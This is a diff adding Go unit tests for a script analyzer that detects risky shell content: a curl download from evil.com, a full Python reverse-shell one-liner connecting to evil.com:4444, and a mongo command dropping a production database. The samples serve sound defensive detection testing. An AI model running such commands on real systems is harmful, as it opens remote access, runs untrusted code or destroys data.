@@ -190,6 +190,63 @@ func TestDestructiveSQLInProduction(t *testing.T) {
 	}
 }
 
+func TestNetworkScriptDownloadDetection(t *testing.T) {
+	script := "curl http://evil.com/script.sh"
+	policy := config.PolicyConfig{}
+
+	findings := AnalyzeScript("test.sh", []byte(script), policy)
+
+	found := false
+	for _, f := range findings {
+		if f.Code == "NETWORK_SCRIPT_DOWNLOAD" {
+			found = true
+			break
+		}
+	}
+
+	if !found {
+		t.Error("expected network script download to be detected")
+	}
+}
+
+func TestReverseShellDetection(t *testing.T) {
+	script := "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+	policy := config.PolicyConfig{}
+
+	findings := AnalyzeScript("test.sh", []byte(script), policy)
+
+	found := false
+	for _, f := range findings {
+		if f.Code == "REVERSE_SHELL" && f.Severity == "critical" {
+			found = true
+			break
+		}
+	}
+
+	if !found {
+		t.Error("expected reverse shell pattern to be detected as critical")
+	}
+}
+
+func TestMongoDropDatabaseDetection(t *testing.T) {
+	script := "mongo production --eval 'db.dropDatabase()'"
+	policy := config.PolicyConfig{OnlyDestructiveSQL: true}
+
+	findings := AnalyzeScript("test.sh", []byte(script), policy)
+
+	found := false
+	for _, f := range findings {
+		if f.Code == "DATABASE_OPERATION" {
+			found = true
+			break
+		}
+	}
+
+	if !found {
+		t.Error("expected mongo dropDatabase to be detected as destructive")
+	}
+}
+
 func TestGitOperationsDisabledByConfig(t *testing.T) {
 	script := "git push --force origin main"
 	policy := config.PolicyConfig{
